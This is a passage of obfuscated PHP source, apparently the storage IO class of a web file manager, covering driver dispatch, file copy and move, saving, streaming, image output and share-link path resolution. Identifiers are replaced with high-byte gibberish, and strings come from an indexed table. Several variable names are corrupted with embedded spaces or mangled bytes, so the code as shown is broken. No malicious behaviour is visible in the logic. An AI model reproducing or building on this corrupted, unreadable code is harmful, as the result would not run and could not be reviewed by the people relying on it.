array_values($–Ÿş¾)); $ƒ¢¾‰ˆŞ = implode($üµê“å‡[71] . PHP_EOL, $ƒ¢¾‰ˆŞ) . $üµê“å‡[71]; if ($ìŒë–´ && $ìŒë–´ == $üµê“å‡[13]) { return $ƒ¢¾‰ˆŞ; } $‰Ùµ‹Àß = array(); $˜ÓÄİÖ‚ = array($üµê“å‡[1125] => $üµê“å‡[1138], $üµê“å‡[315] => $üµê“å‡[1139]); $ˆ‹Ù•²û = $üµê“å‡[12]; foreach ($èÜˆÔšÈ as $Úİœ¥’î) { if ($Úİœ¥’î[$üµê“å‡[57]] == $üµê“å‡[88]) { $ˆ‹Ù•²û = $Úİœ¥’î[$üµê“å‡[32]]; } $ê×ÅÊÆû = array($üµê“å‡[385] . $Úİœ¥’î[$üµê“å‡[32]] . $üµê“å‡[385], isset($˜ÓÄİÖ‚[$Úİœ¥’î[$üµê“å‡[33]]]) ? $˜ÓÄİÖ‚[$Úİœ¥’î[$üµê“å‡[33]]] : $Úİœ¥’î[$üµê“å‡[33]], $Úİœ¥’î[$üµê“å‡[35]] == $üµê“å‡[88] ? $üµê“å‡[1130] : $üµê“å‡[1140] . $Úİœ¥’î[$üµê“å‡[56]], $Úİœ¥’î[$üµê“å‡[57]] == $üµê“å‡[88] ? $üµê“å‡[1141] : $üµê“å‡[12]); $‰Ùµ‹Àß[] = trim(implode($üµê“å‡[53], $ê×ÅÊÆû)); } foreach ($–Ÿş¾ as $Æë…ª£¸ => $ÚÓœ”¬“) { $ü¼¸˜ˆ = str_replace($üµê“å‡[1142] . $ø¡Ğê”» . $üµê“å‡[11], $üµê“å‡[12], $Æë…ª£¸); $É‹Ö¤ · = str_replace(array($üµê“å‡[118], $üµê“å‡[964]), $üµê“å‡[385], substr($ÚÓœ”¬“, stripos($ÚÓœ”¬“, $üµê“å‡[260]))); if ($ü¼¸˜ˆ == $üµê“å‡[1119]) { $­™ş½óÊ = $üµê“å‡[1143] . $ˆ‹Ù•²û . $üµê“å‡[1144]; } else { $­™ş½óÊ = (stripos($ü¼¸˜ˆ, $üµê“å‡[11]) ? $üµê“å‡[1145] : $üµê“å‡[12]) . ($üµê“å‡[1146] . $ü¼¸˜ˆ . $üµê“å‡[1147] . $É‹Ö¤ ·); } $‰Ùµ‹Àß[] = $­™ş½óÊ; } $‘ÕÒ·± = array($üµê“å‡[1148] . $ø¡Ğê”» . $üµê“å‡[1149], $üµê“å‡[1150] . $ø¡Ğê”» . $üµê“å‡[1151], implode($üµê“å‡[50] . PHP_EOL, $‰Ùµ‹Àß), $üµê“å‡[1152]); $ó¯Ñ´”÷ = implode(PHP_EOL, $‘ÕÒ·±); if ($ìŒë–´ && $ìŒë–´ == $üµê“å‡[811]) { return $ó¯Ñ´”÷; } $ˆ¿×”óæ = array($üµê“å‡[811] => $ó¯Ñ´”÷, $üµê“å‡[13] => $ƒ¢¾‰ˆŞ); return $ìŒë–´ ? $ˆ¿×”óæ[$ìŒë–´] : $ˆ¿×”óæ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¾¬â €, $Å½……¾ª) { $»¤íÖ¾Û =& $_SERVER[ñˆ‹ß¿÷]; $¿ç»‰ª¯ = $Å½……¾ª; $GLOBALS[$»¤íÖ¾Û[1153]] = $»¤íÖ¾Û[1154] . $¾¬â €; Hook::trigger($»¤íÖ¾Û[1154] . $¾¬â € . $»¤íÖ¾Û[1155], $¿ç»‰ª¯); $ÒÄó³Äœ = self::driverMake($Å½……¾ª[0]); if (!$ÒÄó³Äœ) { return !1; } if (method_exists($ÒÄó³Äœ, $¾¬â €)) { $ê’·´‘ = @call_user_func_array(array($ÒÄó³Äœ, $¾¬â €), $Å½……¾ª); } else { if (method_exists($ÒÄó³Äœ, $»¤íÖ¾Û[1156])) { $ê’·´‘ = @call_user_func_array(array($ÒÄó³Äœ, $¾¬â €), $Å½……¾ª); } else { if (method_exists(self, $¾¬â €)) { $ê’·´‘ = @call_user_func_array(array(self, $¾¬â €), $Å½……¾ª); } else { $ê’·´‘ = call_user_func_array(array(parent, $¾¬â €), $Å½……¾ª); } } } Hook::trigger($»¤íÖ¾Û[1154] . $¾¬â € . $»¤íÖ¾Û[1157], $¿ç»‰ª¯, $ê’·´‘); return $ê’·´‘; } public static function init($ÁŞöÒÀ°) { return self::driverMake($ÁŞöÒÀ°); } public static function copy($šâ „×‹, $•ó¡€™…, $—Ë¥ì®÷ = false, $ˆù•†µÂ = false) { return self::copyMoveStart($šâ „×‹, $•ó¡€™…, $—Ë¥ì®÷, $_SERVER[ñˆ‹ß¿÷][555], $ˆù•†µÂ); } public static function move($ìüı÷Ã, $¶Š‘º“å, $İª…Û© = false, $£š–½˜Ó = false) { return self::copyMoveStart($ìüı÷Ã, $¶Š‘º“å, $İª…Û©, $_SERVER[ñˆ‹ß¿÷][557], $£š–½˜Ó); } private static function copyMoveStart($œĞïÄ¹‚, $Ê…¬’Áå, $ÅŸ½¹ÊØ, $ˆ§Ï¯ËÕ, $íÒ¹ùŠ–) { $å¬¦ù¯Š =& $_SERVER[ñˆ‹ß¿÷]; $´ß¿ôìÂ = array($œĞïÄ¹‚, $Ê…¬’Áå, $ÅŸ½¹ÊØ, $íÒ¹ùŠ–); Hook::trigger($å¬¦ù¯Š[1154] . $ˆ§Ï¯ËÕ . $å¬¦ù¯Š[1155], $´ß¿ôìÂ); $ÍôÁ¹å = self::copyMove($œĞïÄ¹‚, $Ê…¬’Áå, $ÅŸ½¹ÊØ, $ˆ§Ï¯ËÕ, $íÒ¹ùŠ–); Hook::trigger($å¬¦ù¯Š[1154] . $ˆ§Ï¯ËÕ . $å¬¦ù¯Š[1157], $´ß¿ôìÂ, $ÍôÁ¹å); return $ÍôÁ¹å; } public static function saveFile($Ôà úÁ¡, $Ãş™‘òÂ, $õ‡Ä­Ô² = true) { $ ÍãŞ¿” =& $_SERVER[ñˆ‹ß¿÷]; $€²Í²ğ = self::info($Ãş™‘òÂ); $ÅÓî¡  = self::driverMake($Ôà úÁ¡); $âÔê«ò = self::driverMake($Ãş™‘òÂ); $®ğˆüŞğ = !1; if ($âÔê«ò->pathParse[$ ÍãŞ¿”[1158]]) { $®ğˆüŞğ = $âÔê«ò; $Ôàë®ı = $âÔê«ò->pathParse[$ ÍãŞ¿”[1158]]; $âÔê«ò = self::driverMake($Ôàë®ı); } if ($ÅÓî¡ ->pathParse[$ ÍãŞ¿”[1158]]) { $şøÎïÇÇ = $ÅÓî¡ ->pathParse[$ ÍãŞ¿”[1158]]; $ÅÓî¡  = self::driverMake($şøÎïÇÇ); } $Õ¸ËÛæ¡ = $âÔê«ò->pathFather($Ãş™‘òÂ); $éæé¶·‹ = !0; if (!$õ‡Ä­Ô² && self::driverIsSame($ÅÓî¡ , $âÔê«ò)) { $éæé¶·‹ = !1; } $ÑÛ«°©ş = self::copyFile($ÅÓî¡ , $Ôà úÁ¡, $âÔê«ò, $Õ¸ËÛæ¡, $€²Í²ğ[$ ÍãŞ¿”[32]], $éæé¶·‹); if ($®ğˆüŞğ) { $ÑÛ«°©ş = $®ğˆüŞğ->getPathOuter($ÑÛ«°©ş); } return $ÑÛ«°©ş; } private static function copyMove($›¿±™Š«, $¶¨êÚ°ä, $¹éô§½¸, $ÃºŒ“õÅ, $ĞøûÌşá = false) { $İã¬™…« =& $_SERVER[ñˆ‹ß¿÷]; if (!$›¿±™Š« || $›¿±™Š« == $İã¬™…«[8] || !$¶¨êÚ°ä) { return !1; } ignore_timeout(); $º‹£Ÿ« = self::driverMake($›¿±™Š«); $Ïù´öÙ = self::driverMake($¶¨êÚ°ä); $¹©íò¶ = $ÃºŒ“õÅ == $İã¬™…«[557]; $·ëË¯ñ = !1; if ($Ïù´öÙ->pathParse[$İã¬™…«[1158]]) { $·ëË¯ñ = $Ïù´öÙ; $¶¨êÚ°ä = $Ïù´öÙ->pathParse[$İã¬™…«[1158]]; $Ïù´öÙ = self::driverMake($¶¨êÚ°ä); } if ($º‹£Ÿ«->pathParse[$İã¬™…«[1158]]) { $›¿±™Š« = $º‹£Ÿ«->pathParse[$İã¬™…«[1158]]; $º‹£Ÿ« = self::driverMake($›¿±™Š«); } self::check($º‹£Ÿ«, $›¿±™Š«, $Ïù´öÙ, $¶¨êÚ°ä); Hook::trigger($İã¬™…«[1159], $º‹£Ÿ«, $›¿±™Š«, $Ïù´öÙ, $¶¨êÚ°ä); $Ï´£…Ø° = self::driverIsSame($º‹£Ÿ«, $Ïù´öÙ); if ($Ï´£…Ø°) { if ($ÃºŒ“õÅ == $İã¬™…«[557] && !method_exists($Ïù´öÙ, $İã¬™…«[1160]) && trim($¶¨êÚ°ä, $İã¬™…«[8]) == trim($Ïù´öÙ->pathFather($›¿±™Š«), $İã¬™…«[8])) { if ($º‹£Ÿ«->pathThis($›¿±™Š«) != $ĞøûÌşá && !$º‹£Ÿ«->isTypeObject()) { return $º‹£Ÿ«->rename($›¿±™Š«, $ĞøûÌşá); } return $Ïù´öÙ->getPathOuter($›¿±™Š«); } if (method_exists($Ïù´öÙ, $ÃºŒ“õÅ)) { return $Ïù´öÙ->{$ÃºŒ“õÅ}($›¿±™Š«, $¶¨êÚ°ä, $¹éô§½¸, $ĞøûÌşá); } } if ($Ï´£…Ø° && $ÃºŒ“õÅ == $İã¬™…«[557] && $Ïù´öÙ->getType() == $İã¬™…«[106]) { $ùÒÍ‘Á³ = $Ïù´öÙ->movePath($›¿±™Š«, $¶¨êÚ°ä, $ĞøûÌşá); if ($ùÒÍ‘Á³) { return $ùÒÍ‘Á³; } } $¦çà†Í‹ = $º‹£Ÿ«->isFile($›¿±™Š«); if (!$¦çà†Í‹ && $Ïù´öÙ->getType() == $İã¬™…«[765] && $º‹£Ÿ«->getType() == $İã¬™…«[106]) { $ùÒÍ‘Á³ = $Ïù´öÙ->copyFolderFromIO($º‹£Ÿ«, $›¿±™Š«, $¶¨êÚ°ä, $¹éô§½¸, $¹©íò¶, $ĞøûÌşá); } else { $ùÒÍ‘Á³ = self::copyPath($º‹£Ÿ«, $›¿±™Š«, $Ïù´öÙ, $¶¨êÚ°ä, $¹éô§½¸, $¹©íò¶, $¦çà†Í‹, $ĞøûÌşá); } if ($ùÒÍ‘Á³ && $¹©íò¶) { $º‹£Ÿ«->remove($›¿±™Š«); } if ($·ëË¯ñ) { $ùÒÍ‘Á³ = $·ëË¯ñ->getPathOuter($ùÒÍ‘Á³); } return $ùÒÍ‘Á³; } private static function check($êíÊ†¡, $ËêÒàÆ, $­Á‚ˆ³İ, &$“ƒı¾Û€) { $½¼À‡â¢ =& $_SERVER[ñˆ‹ß¿÷]; if (self::driverIsSame($êíÊ†¡, $­Á‚ˆ³İ) && $êíÊ†¡->isFolder($ËêÒàÆ) && $êíÊ†¡->isParentOf($ËêÒàÆ, $“ƒı¾Û€)) { show_json(LNG($½¼À‡â¢[1161]), !1); } if (!$êíÊ†¡->exist($ËêÒàÆ)) { show_json(LNG($½¼À‡â¢[105]), !1); } } private static function copyPath($ªœûñ“³, $Ÿ¯óŸêù, $æÒ—¢¡Â, $®¦î™ò, $Ëœ²Äí, $—ûŒÑ», $“¯•æüó, $è¼üñ·„ = false, $Œµßüêƒ = true) { $¾¹á†è =& $_SERVER[ñˆ‹ß¿÷]; $ÃÒâÉãù = empty($è¼üñ·„) && $è¼üñ·„ !== $¾¹á†è[197] ? $ªœûñ“³->pathThis($Ÿ¯óŸêù) : $è¼üñ·„; if ($Ëœ²Äí) { $Ëî‰‡‡æ = $æÒ—¢¡Â->fileNameExist($®¦î™ò, $ÃÒâÉãù); $È¬Šœ†ƒ = $ÃÒâÉãù; $ÃÒâÉãù = $æÒ—¢¡Â->fileNameAuto($®¦î™ò, $ÃÒâÉãù, $Ëœ²Äí, !$“¯•æüó); if (!$Ëî‰‡‡æ || $È¬Šœ†ƒ != $ÃÒâÉãù) { $Ëœ²Äí = !1; } if ($Œµßüêƒ && !$Ëœ²Äí) { $æÒ—¢¡Â->_data[$¾¹á†è[1162]] = !0; } } if ($“¯•æüó) { return self::copyFile($ªœûñ“³, $Ÿ¯óŸêù, $æÒ—¢¡Â, $®¦î™ò, $ÃÒâÉãù, $—ûŒÑ»); } if ($Ëœ²Äí == REPEAT_RENAME_FOLDER) { $Ëœ²Äí = !1; } $ƒìÂ³Ù¹ = rtrim($®¦î™ò, $¾¹á†è[8]) . $¾¹á†è[8] . $ÃÒâÉãù; $½Ô–ÛÁ = $æÒ—¢¡Â->mkdir($æÒ—¢¡Â->getPath($ƒìÂ³Ù¹), $Ëœ²Äí); $®¦î™ò = $æÒ—¢¡Â->getPathInner($½Ô–ÛÁ); $¤°ìµõ‡ = $ªœûñ“³->listPath($Ÿ¯óŸêù, !0); $¤°ìµõ‡ = is_array($¤°ìµõ‡) ? $¤°ìµõ‡ : array($¾¹á†è[83] => array(), $¾¹á†è[82] => array()); $¼ÈÛ£ø = array_merge($¤°ìµõ‡[$¾¹á†è[83]], $¤°ìµõ‡[$¾¹á†è[82]]); foreach ($¼ÈÛ£ø as $¤”ËİÌ†) { $ƒÑÉ‚¿ê = $¤”ËİÌ†[$¾¹á†è[33]] == $¾¹á†è[199]; $Ÿ¯óŸêù = $ªœûñ“³->getPathInner($¤”ËİÌ†[$¾¹á†è[84]]); $‚¬«‚Û› = self::copyPath($ªœûñ“³, $Ÿ¯óŸêù, $æÒ—¢¡Â, $®¦î™ò, $Ëœ²Äí, $—ûŒÑ», $ƒÑÉ‚¿ê, !1, !1); if (!$‚¬«‚Û›) { IO::errorTips($¾¹á†è[1163] . $Ÿ¯óŸêù . $¾¹á†è[70] . $®¦î™ò); } } self::copyMoveKeepInfo($ªœûñ“³, $Ÿ¯óŸêù, $½Ô–ÛÁ); return $½Ô–ÛÁ; } private static function copyFile($ó¼Í³êÙ, $’şƒ¡, $Ğ·ŠÜ½œ, $…Ú¥ğŒ, $Şı÷­‚¸, $¯ş„Ñ®À) { $·ı‹û´à =& $_SERVER[ñˆ‹ß¿÷]; $…Ú¥ğŒ = $Ğ·ŠÜ½œ->getPath(rtrim($…Ú¥ğŒ, $·ı‹û´à[8]) . $·ı‹û´à[8] . $Şı÷­‚¸); $²°Ñ²Ô = $·ı‹û´à[1164] . time() . rand_string(5); Hook::trigger($·ı‹û´à[1165], $ó¼Í³êÙ, $’şƒ¡, $Ğ·ŠÜ½œ, $…Ú¥ğŒ, $Şı÷­‚¸, $²°Ñ²Ô); if (self::driverIsSame($ó¼Í³êÙ, $Ğ·ŠÜ½œ)) { if ($¯ş„Ñ®À) { $Û‹ñªİä = $Ğ·ŠÜ½œ->moveFile($’şƒ¡, $…Ú¥ğŒ); } else { $Û‹ñªİä = $Ğ·ŠÜ½œ->copyFile($’şƒ¡, $…Ú¥ğŒ); } Hook::trigger($·ı‹û´à[1166], $ó¼Í³êÙ, $’şƒ¡, $Ğ·ŠÜ½œ, $…Ú¥ğŒ, $Şı÷­‚¸, $Û‹ñªİä); self::copyMoveKeepInfo($ó¼Í³êÙ, $’şƒ¡, $Û‹ñªİä); return $Û‹ñªİä; } $ø´ŠÎœ = TEMP_FILES; if ($GLOBALS[$·ı‹û´à[6]][$·ı‹û´à[89]][$·ı‹û´à[803]]) { $ø´ŠÎœ = $GLOBALS[$·ı‹û´à[6]][$·ı‹û´à[89]][$·ı‹û´à[803]]; } $¥ªùµéı = $ø´ŠÎœ; mk_dir($¥ªùµéı); $ŸÊÛ¡Ä = $¥ªùµéı . $²°Ñ²Ô; $†øı±Ï = $ŸÊÛ¡Ä; $ŸÊÛ¡Ä = $ó¼Í³êÙ->download($’şƒ¡, $ŸÊÛ¡Ä); $ŸÊÛ¡Ä = $ó¼Í³êÙ->iconvApp($ŸÊÛ¡Ä); if (substr($ŸÊÛ¡Ä, strlen($ø´ŠÎœ)) == $ø´ŠÎœ) { $¯ş„Ñ®À = !0; } $Û‹ñªİä = $Ğ·ŠÜ½œ->upload($…Ú¥ğŒ, $ŸÊÛ¡Ä, $¯ş„Ñ®À); self::remove($†øı±Ï); Hook::trigger($·ı‹û´à[1166], $ó¼Í³êÙ, $’şƒ¡, $Ğ·ŠÜ½œ, $…Ú¥ğŒ, $Şı÷­‚¸, $Û‹ñªİä); self::copyMoveKeepInfo($ó¼Í³êÙ, $’şƒ¡, $Û‹ñªİä); return $Û‹ñªİä; } private static function copyMoveKeepInfo($Ë­£Œƒ«, $¤û¹§¥, $¤•àü°º) { if (!$¤•àü°º) { return; } $í¤êÚ¼Ì = $Ë­£Œƒ«->info($¤û¹§¥); if (!is_array($í¤êÚ¼Ì)) { return; } IO::setModifyTime($¤•àü°º, $í¤êÚ¼Ì[$_SERVER[ñˆ‹ß¿÷][85]]); } public static function pathFather($¬„€ò«”) { $Ã½íö = IO::init($¬„€ò«”); $”¸ÇÕïò = $Ã½íö->pathFather($Ã½íö->path); return $Ã½íö->getPathOuter($”¸ÇÕïò); } public static function fileOut($ãª–‚‚æ, $ÄåøÅ‰Ö = false, $ñÔöñÇ = false, $†«ÄôÉÎ = '') { $Ú”Ø¾§ = self::driverMake($ãª–‚‚æ); if ($Ú”Ø¾§->isFileOutServer()) { return $Ú”Ø¾§->fileOutServer($ãª–‚‚æ, $ÄåøÅ‰Ö, $ñÔöñÇ, $†«ÄôÉÎ); } return $Ú”Ø¾§->fileOut($ãª–‚‚æ, $ÄåøÅ‰Ö, $ñÔöñÇ, $†«ÄôÉÎ); } public static function fileOutImage($›Ÿ‚»Ñ, $Ö±Ø® = 250) { $¸­İ³˜Ë = array(250, 600, 1200, 2000, 3000, 5000); for ($Üº¦èÓ… = 0; $Üº¦èÓ… < count($¸­İ³˜Ë); $Üº¦èÓ…++) { if ($Üº¦èÓ… == 0 && $Ö±Ø® <= $¸­İ³˜Ë[$Üº¦èÓ…]) { $Ö±Ø® = $¸­İ³˜Ë[$Üº¦èÓ…]; break; } else { if ($Ö±Ø® > $¸­İ³˜Ë[$Üº¦èÓ… - 1] && $Ö±Ø® <= $¸­İ³˜Ë[$Üº¦èÓ…]) { $Ö±Ø® = $¸­İ³˜Ë[$Üº¦èÓ…]; break; } else { if ($Üº¦èÓ… == count($¸­İ³˜Ë) - 1 && $Ö±Ø® > $¸­İ³˜Ë[$Üº¦èÓ…]) { $Ö±Ø® = $¸­İ³˜Ë[$Üº¦èÓ…]; break; } } } } $åÅşêó = self::driverMake($›Ÿ‚»Ñ); if ($åÅşêó->isFileOutServer()) { return $åÅşêó->fileOutImageServer($›Ÿ‚»Ñ, $Ö±Ø®); } return $åÅşêó->fileOutImage($›Ÿ‚»Ñ, $Ö±Ø®); } private static function driverIsSame($×ÅöÄŞµ, $÷ÔìüÍ) { $¥ÛÚçØÛ =& $_SERVER[ñˆ‹ß¿÷]; $±ÛÚ—–ñ = $×ÅöÄŞµ->getType(); $ã®—ÏŞ = $÷ÔìüÍ->getType(); if ($±ÛÚ—–ñ != $ã®—ÏŞ) { return !1; } if ($±ÛÚ—–ñ == $¥ÛÚçØÛ[765]) { return !0; } if ($±ÛÚ—–ñ == $¥ÛÚçØÛ[106]) { return !0; } if ($×ÅöÄŞµ->pathDriver == $÷ÔìüÍ->pathDriver) { return !0; } return !1; } public static function copyUpdate($›ææÁÄå, $Ùš¨ºÃï) { $öáĞ ƒÔ =& $_SERVER[ñˆ‹ß¿÷]; if (!IO::exist($›ææÁÄå)) { return !1; } if (!IO::exist($Ùš¨ºÃï)) { IO::mkdir($Ùš¨ºÃï); } $ã†¼Âíí = self::_listAll($›ææÁÄå); $à¢Áµ¡ö = self::_listAll($Ùš¨ºÃï); $ ĞæÌÍ = array(); $ €Òüø½ = array(); foreach ($ã†¼Âíí as $Ó—ß®ãŒ => $’ìÆÔê¶) { if (isset($à¢Áµ¡ö[$Ó—ß®ãŒ])) { if ($’ìÆÔê¶[$öáĞ ƒÔ[75]] == 1) { continue; } if ($à¢Áµ¡ö[$Ó—ß®ãŒ][$öáĞ ƒÔ[76]] == $’ìÆÔê¶[$öáĞ ƒÔ[76]]) { continue; } } if ($’ìÆÔê¶[$öáĞ ƒÔ[75]] == 1) { $ €Òüø½[] = $Ùš¨ºÃï . $öáĞ ƒÔ[8] . $Ó—ß®ãŒ; continue; } $Û†ï¶ğÃ = strstr(trim($Ó—ß®ãŒ, $öáĞ ƒÔ[8]), $öáĞ ƒÔ[8]) ? get_path_father($Ó—ß®ãŒ) : $öáĞ ƒÔ[12]; $ ĞæÌÍ[] = array($öáĞ ƒÔ[1167] => $’ìÆÔê¶[$öáĞ ƒÔ[84]], $öáĞ ƒÔ[1168] => rtrim($Ùš¨ºÃï, $öáĞ ƒÔ[8]) . $öáĞ ƒÔ[8] . $Û†ï¶ğÃ, $öáĞ ƒÔ[1169] => $’ìÆÔê¶); } $Ë¾Û”™ = array($öáĞ ƒÔ[199] => $ ĞæÌÍ, $öáĞ ƒÔ[75] => $ €Òüø½); Hook::trigger($öáĞ ƒÔ[1170], $›ææÁÄå, $Ùš¨ºÃï, $Ë¾Û”™); foreach ($ €Òüø½ as $’ìÆÔê¶) { IO::mkdir($’ìÆÔê¶); } foreach ($ ĞæÌÍ as $’ìÆÔê¶) { IO::copy($’ìÆÔê¶[$öáĞ ƒÔ[1167]], $’ìÆÔê¶[$öáĞ ƒÔ[1168]], REPEAT_REPLACE); } } private static function _listAll($˜«¶¾Ùô) { $Ğ½æ¤ƒ® =& $_SERVER[ñˆ‹ß¿÷]; $˜«¶¾Ùô = KodIO::clear($˜«¶¾Ùô); $‚©ê = IO::listAll($˜«¶¾Ùô); foreach ($‚©ê as &$ò¸î¯÷÷) { $à¡Ôõå = substr($ò¸î¯÷÷[$Ğ½æ¤ƒ®[84]], strlen($˜«¶¾Ùô)); $ò¸î¯÷÷[$Ğ½æ¤ƒ®[1171]] = trim($à¡Ôõå, $Ğ½æ¤ƒ®[8]); } unset($ò¸î¯÷÷); return array_to_keyvalue($‚©ê, $Ğ½æ¤ƒ®[1171]); } public static function fileSubstr($˜‹…Î€Ğ, $“˜‚›ğ, $Ô¥ƒòã¥ = false) { $à¬”¦óş =& $_SERVER[ñˆ‹ß¿÷]; $İü…Àí = self::driverMake($˜‹…Î€Ğ); $¤º¨ ¦˜ = $İü…Àí->size($˜‹…Î€Ğ); $ÃöÒ¾± = $“˜‚›ğ; $‹²Š¢Ğ = $Ô¥ƒòã¥; if ($“˜‚›ğ < 0) { $“˜‚›ğ = $¤º¨ ¦˜ + $“˜‚›ğ; } if ($Ô¥ƒòã¥ === !1) { $Ô¥ƒòã¥ = $¤º¨ ¦˜ - $“˜‚›ğ; } if ($“˜‚›ğ + $Ô¥ƒòã¥ > $¤º¨ ¦˜) { $Ô¥ƒòã¥ = $¤º¨ ¦˜ - $“˜‚›ğ; } if (!$¤º¨ ¦˜ && $İü…Àí->getType() == $à¬”¦óş[106] && !$İü…Àí->exist($˜‹…Î€Ğ)) { $çÁûæƒ¦ = get_path_this($˜‹…Î€Ğ); $Šº‚¥çÁ = parse_url_query($çÁûæƒ¦); if (is_array($Šº‚¥çÁ) && isset($Šº‚¥çÁ[$à¬”¦óş[32]])) { $çÁûæƒ¦ = urldecode($Šº‚¥çÁ[$à¬”¦óş[32]]); } throw new Exception($à¬”¦óş[1172] . LNG($à¬”¦óş[1173]) . $à¬”¦óş[973] . clear_html($çÁûæƒ¦) . $à¬”¦óş[12]); } if ($Ô¥ƒòã¥ <= 0) { return $à¬”¦óş[12]; } if ($“˜‚›ğ < 0 || $“˜‚›ğ >= $¤º¨ ¦˜ || $Ô¥ƒòã¥ > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\145\x52\x65\x61\144\x20\145\162\162\157\162\x21\x20\x73\x74\x61\162\x74\x3d{$“˜‚›ğ}\73\x6c\145\x6e\x67\x74\150\75{$Ô¥ƒòã¥}\x3b\x20\x73\151\x7a\145\75{$¤º¨ ¦˜}\73"); } $Ÿ¦‰–íø = $İü…Àí->fileSubstr($˜‹…Î€Ğ, $“˜‚›ğ, $Ô¥ƒòã¥); if (!$Ÿ¦‰–íø && $Ô¥ƒòã¥ && isset($GLOBALS[$à¬”¦óş[1174]])) { throw new Exception($GLOBALS[$à¬”¦óş[1174]][$à¬”¦óş[1175]]); } return $Ÿ¦‰–íø; } private static function driverMake(&$‘š½¯) { $Å÷‡€Å‘ =& $_SERVER[ñˆ‹ß¿÷]; $İ¨³ªê¯ = KodIO::parse($‘š½¯); if (!self::$driverListSystem) { $ÎÜÃ³ÂË = Model($Å÷‡€Å‘[774])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÎÜÃ³ÂË, $Å÷‡€Å‘[399]); } if ($İ¨³ªê¯[$Å÷‡€Å‘[33]] == KodIO::KOD_IO && !self::$driverListSystem[$İ¨³ªê¯[$Å÷‡€Å‘[399]]]) { return !1; } $‘š½¯ = $İ¨³ªê¯[$Å÷‡€Å‘[1176]]; $¦œğĞ€ = self::driverGet($İ¨³ªê¯, $‘š½¯); return $¦œğĞ€; } private static function driverGet($‡ÌîÂõ½, &$ûçƒÁšç) { $³Î¦øïà =& $_SERVER[ñˆ‹ß¿÷]; $‹“˜Ğ€ = $‡ÌîÂõ½[$³Î¦øïà[1177]]; $Š‰Ø×˜ö = $‡ÌîÂõ½[$³Î¦øïà[399]]; switch ($‡ÌîÂõ½[$³Î¦øïà[33]]) { case KodIO::KOD_IO: $Ï°Ùò·› = self::$driverListSystem[$Š‰Ø×˜ö]; break; case KodIO::KOD_SOURCE: $ûçƒÁšç = $Š‰Ø×˜ö . $ûçƒÁšç; $Ï°Ùò·› = array($³Î¦øïà[1178] => $³Î¦øïà[1179], $³Î¦øïà[6] => $‡ÌîÂõ½); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $şüê×«  = $GLOBALS[$³Î¦øïà[1180]]; self::$driverListUser = array_to_keyvalue($şüê×« , $³Î¦øïà[399]); } $Ï°Ùò·› = self::$driverListUser[$Š‰Ø×˜ö]; break; case KodIO::KOD_SHARE_LINK: $Ï°Ùò·› = array($³Î¦øïà[1178] => $³Î¦øïà[1181], $³Î¦øïà[6] => $‡ÌîÂõ½); $ˆÉ€ôÇ• = Action($³Î¦øïà[1182])->sharePathInfo($‡ÌîÂõ½[$³Î¦øïà[84]]); $ûçƒÁšç = $ˆÉ€ôÇ•[$³Î¦øïà[402]]; if (!$ˆÉ€ôÇ•[$³Î¦øïà[402]]) { $Éä¢ıÍÔ = Model($³Î¦øïà[601])->getInfo($ˆÉ€ôÇ•[$³Î¦øïà[489]]); $ûçƒÁšç = KodIO::clear($Éä¢ıÍÔ[$³Î¦øïà[1183]] . $‡ÌîÂõ½[$³Î¦øïà[1176]]); $‡ÌîÂõ½[$³Î¦øïà[487]] = $Éä¢ıÍÔ; $‡ÌîÂõ½[$³Î¦øïà[1158]] = $ûçƒÁšç; $Ï°Ùò·› = array($³Î¦øïà[1178] => $³Î¦øïà[1184], $³Î¦øïà[6] => $‡ÌîÂõ½); } break; case KodIO::KOD_SHARE_ITEM: $Ï°Ùò·› = array($³Î¦øïà[1178] => $³Î¦øïà[1185], $³Î¦øïà[6] => $‡ÌîÂõ½); $Éä¢ıÍÔ = Model($³Î¦øïà[601])->getInfo($‡ÌîÂõ½[$³Î¦øïà[399]]); if ($Éä¢ıÍÔ[$³Î¦øïà[402]] == $³Î¦øïà[197]) { $ûçƒÁšç = KodIO::clear($Éä¢ıÍÔ[$³Î¦øïà[1183]] . $‡ÌîÂõ½[$³Î¦øïà[1176]]); $‡ÌîÂõ½[$³Î¦øïà[487]] = $Éä¢ıÍÔ; $‡ÌîÂõ½[$³Î¦øïà[1158]] = $ûçƒÁšç; $Ï°Ùò·› = array($³Î¦øïà[1178] => $³Î¦øïà[1186], $³Î¦øïà[6] => $‡ÌîÂõ½); } else { if (!$ûçƒÁšç) { $ûçƒÁšç = $Éä¢ıÍÔ[$³Î¦øïà[402]]; } } break; default: $ûçƒÁšç = $‡ÌîÂõ½[$³Î¦øïà[84]]; $Ï°Ùò·› = array($³Î¦øïà[1178] => $³Î¦øïà[1187]); break; } $ƒ¯ºÅ§à = $‡ÌîÂõ½[$³Î¦øïà[84]]; if (!isset(self::$driverCache[$ƒ¯ºÅ§à])) { $Öóïı•÷ = strtolower($Ï°Ùò·›[$³Î¦øïà[95]]); $¢ıˆ¶®Æ = $GLOBALS[$³Î¦øïà[6]][$³Î¦øïà[89]][$³Î¦øïà[833]]; $ßùûêåŞ = $³Î¦øïà[74] . (isset($¢ıˆ¶®Æ[$Öóïı•÷]) ? $¢ıˆ¶®Æ[$Öóïı•÷] : ucfirst($Öóïı•÷)); if (!class_exists($ßùûêåŞ)) { show_json("{$ßùûêåŞ}\x20\156\x6f\164\40\145\x78\x69\163\164\x73\41", !1); } $°õªù¥ = isset($Ï°Ùò·›[$³Î¦øïà[6]]) ? $Ï°Ùò·›[$³Î¦øïà[6]] : !1; self::$driverCache[$ƒ¯ºÅ§à] = new $ßùûêåŞ($°õªù¥); } $§¬³ıµ = self::$driverCache[$ƒ¯ºÅ§à]; $§¬³ıµ->pathDriver = $‹“˜Ğ€; $§¬³ıµ->pathBase = $³Î¦øïà[12]; if (isset($Ï°Ùò·›[$³Î¦øïà[6]][$³Î¦øïà[1188]])) { $§¬³ıµ->pathBase = rtrim($Ï°Ùò·›[$³Î¦øïà[6]][$³Î¦øïà[1188]], $³Î¦øïà[8]) . $³Î¦øïà[8]; $ûçƒÁšç = $§¬³ıµ->pathBase . ltrim($ûçƒÁšç, $³Î¦øïà[8]); } $ûçƒÁšç = $§¬³ıµ->getPath($ûçƒÁšç); if (isset($‡ÌîÂõ½[$³Î¦øïà[1158]])) { $ûçƒÁšç = $‡ÌîÂõ½[$³Î¦øïà[1158]]; } $§¬³ıµ->path = 